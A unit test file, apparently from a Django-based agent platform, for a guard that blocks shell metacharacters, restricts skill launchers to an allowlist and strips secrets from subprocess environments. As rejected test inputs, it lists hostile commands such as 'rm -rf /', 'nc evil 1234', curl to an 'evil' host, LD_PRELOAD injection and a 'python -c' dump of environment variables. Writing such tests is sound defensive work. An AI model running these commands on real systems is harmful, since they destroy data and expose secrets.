"""Skill 执行护栏（skill_exec_guard）单元测试。

覆盖第 1 层加固的三条核心约束：
1. 命令不再经 shell 解释，含元字符即拒绝；
2. 只允许白名单启动器，内联代码与运行期装包被拒绝；
3. 子进程环境剥离平台机密（DJANGO_SECRET_KEY / POSTGRES_PASSWORD 等）。
"""

import os
import unittest

from django.test import SimpleTestCase

from orchestrator_integration.builtin_tools.skill_exec_guard import (
    SkillCommandError,
    build_skill_env,
    contains_unsafe_shell_syntax,
    parse_skill_command,
    validate_skill_command,
)


class ParseSkillCommandTests(SimpleTestCase):
    def test_parses_plain_argv(self):
        invocation = parse_skill_command(
            "python whart_tools.py --action get_projects"
        )
        self.assertEqual(
            invocation.argv, ["python", "whart_tools.py", "--action", "get_projects"]
        )
        self.assertEqual(invocation.env_overrides, {})
        self.assertIsNone(invocation.stdin_text)

    def test_keeps_quoted_json_payload_as_single_argument(self):
        invocation = parse_skill_command(
            """python api_automation_tools.py --params '{"page":1,"page_size":50}'"""
        )
        self.assertEqual(invocation.argv[-1], '{"page":1,"page_size":50}')

    def test_keeps_metacharacters_inside_quotes_as_literal(self):
        invocation = parse_skill_command(
            'python read_url.py "https://e.com/p?a=1&b=2"'
        )
        self.assertEqual(invocation.argv[-1], "https://e.com/p?a=1&b=2")

    def test_translates_env_prefix_into_child_env(self):
        invocation = parse_skill_command("BU_NAME=r7k2 browser-use screenshot")
        self.assertEqual(invocation.argv, ["browser-use", "screenshot"])
        self.assertEqual(invocation.env_overrides, {"BU_NAME": "r7k2"})

    def test_rejects_non_allowlisted_env_prefix(self):
        for command in (
            "PATH=/tmp/evil python main.py",
            "LD_PRELOAD=/tmp/evil.so node run.js",
            "NODE_OPTIONS=--require=/tmp/evil.js node run.js",
        ):
            with self.subTest(command=command):
                with self.assertRaises(SkillCommandError):
                    parse_skill_command(command)

    def test_translates_heredoc_into_stdin(self):
        invocation = parse_skill_command(
            "BU_NAME=r7k2 browser-use <<'PY'\nprint(1)\nPY"
        )
        self.assertEqual(invocation.argv, ["browser-use"])
        self.assertEqual(invocation.env_overrides, {"BU_NAME": "r7k2"})
        self.assertEqual(invocation.stdin_text, "print(1)")

    def test_rejects_heredoc_without_command(self):
        with self.assertRaises(SkillCommandError):
            parse_skill_command("<<'PY'\nprint(1)\nPY")

    def test_rejects_overlong_command(self):
        with self.assertRaises(SkillCommandError):
            parse_skill_command("python main.py " + "a" * 100001)

    def test_rejects_unquoted_shell_metacharacters(self):
        commands = (
            "python x.py; rm -rf /",
            "python x.py && curl http://evil",
            "python x.py | nc evil 1234",
            "python x.py > /etc/passwd",
            "python x.py `whoami`",
            "python x.py $(whoami)",
            "python x.py\nrm -rf /",
        )
        for command in commands:
            with self.subTest(command=command):
                with self.assertRaises(SkillCommandError):
                    parse_skill_command(command)

    def test_rejects_unbalanced_quotes(self):
        with self.assertRaises(SkillCommandError):
            parse_skill_command('python x.py --url "unterminated')

    def test_contains_unsafe_shell_syntax_flags_unquoted_only(self):
        # 历史语义（playwright-cli 归一化仍在用）：单引号内的 | & < > 也视为不安全，
        # 但单引号内的 ; 与 $ 放行；双引号内的 $ 与反引号不安全。
        self.assertTrue(contains_unsafe_shell_syntax("a; b"))
        self.assertTrue(contains_unsafe_shell_syntax('a "$(b)"'))
        self.assertTrue(contains_unsafe_shell_syntax("a 'b|c'"))
        self.assertFalse(contains_unsafe_shell_syntax("a 'b;c'"))
        self.assertFalse(contains_unsafe_shell_syntax('a "b|c"'))

    def test_unquoted_metacharacter_detection_treats_quotes_as_literal(self):
        from orchestrator_integration.builtin_tools.skill_exec_guard import (
            has_unquoted_shell_metacharacter,
        )

        # 无 shell 执行路径：引号内一律字面量
        self.assertFalse(has_unquoted_shell_metacharacter("a 'b|c'"))
        self.assertFalse(has_unquoted_shell_metacharacter('a "b|c"'))
        self.assertFalse(has_unquoted_shell_metacharacter("a 'b&c'"))
        # 未加引号才是「按 shell 语义书写」
        self.assertTrue(has_unquoted_shell_metacharacter("a; b"))
        self.assertTrue(has_unquoted_shell_metacharacter("a & b"))
        self.assertTrue(has_unquoted_shell_metacharacter("a > b"))

    def test_single_quoted_url_with_query_string_is_accepted(self):
        invocation = parse_skill_command(
            "python read_url.py 'https://example.com/p?a=1&b=2'"
        )
        self.assertEqual(invocation.argv[-1], "https://example.com/p?a=1&b=2")


class ValidateSkillCommandTests(SimpleTestCase):
    def test_allows_known_launchers(self):
        for argv in (
            ["python", "main.py"],
            ["python3", "main.py"],
            ["node", "run.js"],
            ["playwright-cli", "open"],
            ["browser-use", "run", "task"],
            ["npx", "--no-install", "playwright-cli", "open"],
        ):
            with self.subTest(argv=argv):
                validate_skill_command(argv)

    def test_rejects_generic_shell_tools(self):
        for argv in (
            ["bash", "-c", "id"],
            ["sh", "-c", "id"],
            ["curl", "http://evil"],
            ["rm", "-rf", "/"],
            ["./run.sh"],
        ):
            with self.subTest(argv=argv):
                with self.assertRaises(SkillCommandError):
                    validate_skill_command(argv)

    def test_rejects_inline_code_execution(self):
        for argv in (
            ["python", "-c", "import os; print(os.environ)"],
            ["python3", "-c", "1"],
            ["node", "-e", "console.log(1)"],
            ["node", "--eval", "1"],
        ):
            with self.subTest(argv=argv):
                with self.assertRaises(SkillCommandError):
                    validate_skill_command(argv)

    def test_rejects_attached_short_flag_inline_code(self):
        """短选项粘连写法（-c"code" / -mmod / --eval=code）必须同样被拦。"""
        for argv in (
            ["python", '-cimport os;print(os.environ)'],
            ["python", "-mhttp.server"],
            ["python", "-mpip", "install", "requests"],
            ["node", "--eval=console.log(1)"],
            ["node", "-e1"],
            ["python", "-"],
        ):
            with self.subTest(argv=argv):
                with self.assertRaises(SkillCommandError):
                    validate_skill_command(argv)

    def test_does_not_overblock_ordinary_options(self):
        """普通长选项不得被误判为裸 `-`（读 stdin）的粘连形式。"""
        for argv in (
            ["python", "main.py", "--x", "1"],
            ["python", "x.py", "-v"],
            ["python", "x.py", "--index-url", "https://pypi.org/simple"],
            ["node", "run.js", "--inspect"],
        ):
            with self.subTest(argv=argv):
                validate_skill_command(argv)

    def test_rejects_runtime_package_installation(self):
        for argv in (
            ["python", "-m", "pip", "install", "requests"],
            ["python3", "-m", "ensurepip"],
            ["npm", "install", "left-pad"],
            ["npm", "ci"],
            ["npx", "some-other-package"],
            ["npx", "playwright"],
        ):
            with self.subTest(argv=argv):
                with self.assertRaises(SkillCommandError):
                    validate_skill_command(argv)

    def test_rejects_launcher_escaping_skill_dir(self):
        with self.assertRaises(SkillCommandError):
            validate_skill_command(["../evil/python"], skill_dir="/srv/skill")


class BuildSkillEnvTests(SimpleTestCase):
    def test_strips_platform_secrets(self):
        source = {
            "PATH": "/usr/bin",
            "HOME": "/root",
            "DJANGO_SECRET_KEY": "super-secret",
            "POSTGRES_PASSWORD": "db-pass",
            "NEW_API_KEY": "llm-key",
            "LICENSE_SERVER_URL": "https://license",
            "DOCX_EDITOR_SERVICE_KEY": "docx-key",
        }

        env = build_skill_env(source_env=source)

        self.assertEqual(env["PATH"], "/usr/bin")
        self.assertEqual(env["HOME"], "/root")
        for leaked in (
            "DJANGO_SECRET_KEY",
            "POSTGRES_PASSWORD",
            "NEW_API_KEY",
            "LICENSE_SERVER_URL",
            "DOCX_EDITOR_SERVICE_KEY",
        ):
            self.assertNotIn(leaked, env)

    def test_does_not_inherit_pythonpath(self):
        # PYTHONPATH=/app 会让 skill 脚本 import 到后端 settings，进而读到 SECRET_KEY。
        env = build_skill_env(source_env={"PATH": "/usr/bin", "PYTHONPATH": "/app"})
        self.assertNotIn("PYTHONPATH", env)

    def test_runtime_env_is_injected_explicitly(self):
        env = build_skill_env(
            source_env={"PATH": "/usr/bin"},
            runtime_env={
                "WHARTTEST_API_KEY": "user-scoped",
                "SCREENSHOT_DIR": "/tmp/shot",
                "ARTIFACT_DIR": "/tmp/art",
            },
        )
        self.assertEqual(env["WHARTTEST_API_KEY"], "user-scoped")
        self.assertEqual(env["SCREENSHOT_DIR"], "/tmp/shot")
        self.assertEqual(env["ARTIFACT_DIR"], "/tmp/art")

    def test_extra_allowlist_cannot_smuggle_secret_named_key(self):
        env = build_skill_env(
            source_env={"PATH": "/usr/bin", "CUSTOM_API_KEY": "leak"},
            allowlist_extra=["CUSTOM_API_KEY"],
        )
        self.assertNotIn("CUSTOM_API_KEY", env)

    def test_empty_source_env_yields_no_ambient_values(self):
        env = build_skill_env(source_env={})
        self.assertEqual(env, {})

    @unittest.skipIf(os.name == "nt", "POSIX 专用")
    def test_preexec_fn_does_not_tighten_nproc_by_default(self):
        """不得默认收紧 RLIMIT_NPROC：它按真实 uid 整机计数，会误伤 Node/Chromium 建线程
        （实测宿主 uid 已有 597 个进程/线程，默认 256 会让 Node 直接断言中止）。"""
        import resource
        import subprocess
        import sys

        from orchestrator_integration.builtin_tools.skill_exec_guard import (
            build_preexec_fn,
        )

        parent_soft, _ = resource.getrlimit(resource.RLIMIT_NPROC)
        proc = subprocess.run(
            [
                sys.executable,
                "-c",
                "import resource;print(resource.getrlimit(resource.RLIMIT_NPROC)[0])",
            ],
            capture_output=True,
            text=True,
            preexec_fn=build_preexec_fn(30),
        )
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertEqual(int(proc.stdout.strip()), parent_soft)

    @unittest.skipIf(os.name == "nt", "POSIX 专用")
    def test_preexec_fn_is_available_on_posix(self):
        from orchestrator_integration.builtin_tools.skill_exec_guard import (
            build_preexec_fn,
        )

        self.assertIsNotNone(build_preexec_fn(30))